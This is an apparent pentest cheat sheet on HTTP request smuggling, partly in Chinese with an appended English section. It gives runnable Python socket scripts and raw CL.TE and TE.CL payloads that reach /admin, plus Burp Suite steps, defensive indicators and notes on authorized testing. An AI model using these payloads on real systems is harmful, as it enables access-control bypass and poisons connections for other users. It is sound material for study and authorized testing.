# http-smuggling-test · part 1（续）

> 接 [`http-smuggling-test-p1.md`](http-smuggling-test-p1.md) 的后半段（原块 >12KB 拆分）。

### 6.1 原始 Socket 发送

```python
import socket
import ssl

def send_smuggled_request(host, port, payload):
    """发送走私请求"""
    
    # 建立连接
    sock = socket.create_connection((host, port))
    if port == 443:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
    
    # 发送 payload
    sock.sendall(payload.encode())
    
    # 接收响应
    response = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except:
            break
    
    sock.close()
    return response.decode('utf-8', errors='ignore')

# CL.TE 走私示例
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.com\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)

response = send_smuggled_request('target.com', 443, payload)
print(response)
```

### 6.2 完整 CL.TE 利用

```python
def exploit_cl_te(host, port=443):
    """CL.TE 走私攻击"""
    
    # 构造走私请求（访问管理员接口）
    smuggled = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 150\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x="
    )
    
    sock = socket.create_connection((host, port))
    if port == 443:
        sock = ssl.wrap_socket(sock, server_hostname=host)
    
    # 发送走私请求
    sock.sendall(smuggled.encode())
    
    # 发送正常请求（会被拼接到走私请求后）
    normal = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    sock.sendall(normal.encode())
    
    # 接收响应
    response = sock.recv(8192).decode('utf-8', errors='ignore')
    sock.close()
    
    return response
```

### 6.3 完整 TE.CL 利用

```python
def exploit_te_cl(host, port=443):
    """TE.CL 走私攻击"""
    
    # 计算 chunked 编码长度
    smuggled_request = (
        "GPOST /admin HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1"
    )
    
    chunk_size = hex(len(smuggled_request))[2:]  # 转16进制
    
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        f"{chunk_size}\r\n"
        f"{smuggled_request}\r\n"
        "0\r\n"
        "\r\n"
    )
    
    sock = socket.create_connection((host, port))
    if port == 443:
        sock = ssl.wrap_socket(sock, server_hostname=host)
    
    sock.sendall(payload.encode())
    response = sock.recv(8192).decode('utf-8', errors='ignore')
    sock.close()
    
    return response
```

---
## 七、Burp Suite 测试

### HTTP Request Smuggler 插件

```
1. 安装: Burp → Extender → BApp Store → HTTP Request Smuggler
2. 使用: 右键请求 → Extensions → Smuggle probe
3. 查看结果: 插件自动测试 CL.TE, TE.CL, TE.TE
```

### 手动测试步骤

```
1. 抓取正常请求
2. 修改为走私 payload
3. 发送到 Repeater
4. 观察响应时间和内容
5. 如果超时或异常 → 可能存在走私
```

---
## 八、防护检测

```python
# 检测是否有走私防护

# 1. 请求规范化
# 特征: 同时存在 CL 和 TE 时，服务器拒绝请求（400 Bad Request）

# 2. 前后端一致性
# 特征: 前后端使用相同的解析逻辑

# 3. HTTP/2 强制
# 特征: 不支持 HTTP/1.1，强制使用 HTTP/2

# 4. 严格的头部验证
# 特征: 拒绝畸形的 Transfer-Encoding 头
```

---
## 十、注意事项

1. **测试环境**: 优先在测试环境测试，生产环境谨慎
2. **影响范围**: 走私可能影响其他用户，测试时注意
3. **PoC 证据**: 保存完整的请求和响应
4. **及时报告**: 发现走私漏洞后立即报告，不要深入利用

---
## 二、补充：request-smuggling

### request-smuggling

### HTTP Request Smuggling
## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.

---
